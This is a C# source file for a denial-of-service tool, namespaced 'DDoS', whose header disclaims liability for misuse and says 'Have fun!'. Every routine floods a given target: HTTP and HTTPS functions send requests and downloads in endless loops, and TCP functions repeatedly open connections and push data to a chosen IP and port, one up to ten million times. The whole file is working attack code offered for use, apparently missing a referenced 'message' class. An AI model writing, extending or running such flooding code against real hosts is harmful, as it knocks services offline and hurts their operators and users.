/*
-----------------------------------------------------------------------------------------
Copyright © 2021 MishDotCom. All rights reserved.
Only BACKEND of application!
No ddos.exe shell data included!
Developer not held accountable for any misuse!
Have fun!
-----------------------------------------------------------------------------------------
*/

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.IO;
using System.Net.Sockets;
using System.Net;
using System.Net.Http;

namespace DDoS
{
    class DDoS
    {
        public static int counter = 0;

        //http------------------------------------------------
        public static void ProtocolHTTPBoth(string ip) //-b
        {
            while (true)
            {
                try
                {
                    HttpClient httpClient = new HttpClient();
                    httpClient.GetStringAsync(ip).Wait(1000);
                    httpClient.GetStreamAsync(ip).Wait(1000);
                    httpClient.Dispose();
                    WebClient client = new WebClient();
                    client.DownloadStringAsync(new Uri(ip));
                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(GETPreparedUrl(ip));
                    var res = (HttpWebResponse)req.GetResponse();
                    counter++;
                }
                catch
                {
                    counter++;
                    break;
                }
                
            }
        }
        public static void ProtocolHTTPDownload(string ip) //-d
        {
            while (true)
            {
                try
                {
                    HttpClient httpClient = new HttpClient();
                    httpClient.GetStringAsync(ip).Wait(1000);
                    httpClient.GetStreamAsync(ip).Wait(1000);
                    httpClient.Dispose();
                    WebClient client = new WebClient();
                    client.DownloadStringAsync(new Uri(ip));
                    counter++;
                }
                catch
                {
                    counter++;
                    break;
                }
                
            }
        }

        public static void ProtocolHTTPReqGET(string ip) //-g
        {
            while (true)
            {
                try
                {
                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(GETPreparedUrl(ip));
                    var res = (HttpWebResponse)req.GetResponse();
                    counter++;
                }
                catch
                {
                    counter++;
                    break;
                }
                
            }
        }

        //httpS------------------------------------------------
        public static void ProtocolHTTPSBoth(string ip) //-b
        {
            while (true)
            {
                try
                {
                    WebClient client = new WebClient();
                    client.DownloadStringAsync(new Uri(ip));
                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(GETPreparedUrl(ip));
                    HttpWebResponse res = (HttpWebResponse)req.GetResponse();  
                    counter++;
                }
                catch
                {
                    counter++;
                    break;
                }
            }
        }

        public static void ProtocolHTTPSReqGET(string ip) //-g
        {
             while (true)
            {
                try
                {
                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(GETPreparedUrl(ip));
                    var res = (HttpWebResponse)req.GetResponse();
                    counter++;
                }
                catch
                {
                    counter++;
                    break;
                }
                
            }
        }

         public static void ProtocolHTTPSDownload(string ip) //-d
        {
             while (true)
            {
                try
                {
                    WebClient client = new WebClient();
                    client.DownloadStringAsync(new Uri(ip));
                    counter++;
                }
                catch
                {
                    counter++;
                    break;
                }
                
            }
        }

        //TCP---------------------------------------
        public static void ProtocolTCPHEAVY(string ip, int port) //-h
        {
            IPAddress ipA = IPAddress.Parse(ip);
            IPEndPoint exit = new IPEndPoint(ipA, port);
            while (true)
            {
                Random seed = new Random();
                int timeout = seed.Next(1000, 10000);
                Socket sender = new Socket(ipA.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                try
                {
                    sender.ConnectAsync(exit).Wait(timeout);
                    sender.Send(message.data);
                    sender.Close();
                }
                catch (Exception)
                {
                    break;
                }
            }
        }

        public static void ProtocolTCPEZ(string ip, int port) // -e
        {
            for (int p = 0; p < 10000000; p++)
            {
                Random seed = new Random();
                int timeout = seed.Next(1000, 3000);
                TcpClient tcp = new TcpClient();
                try
                {
                    tcp.ConnectAsync(ip, port).Wait(timeout);
                    if (tcp.Connected)
                    {
                        tcp.Close();
                    }
                    else
                    {
                        tcp.Close();
                    }
                }
                catch (Exception)
                {
                    tcp.Close();
                }
            }
        }

        public static string GETPreparedUrl(string oldurl)
        {
            string new_url = oldurl + message.values;
            return new_url;
        }
    }
}
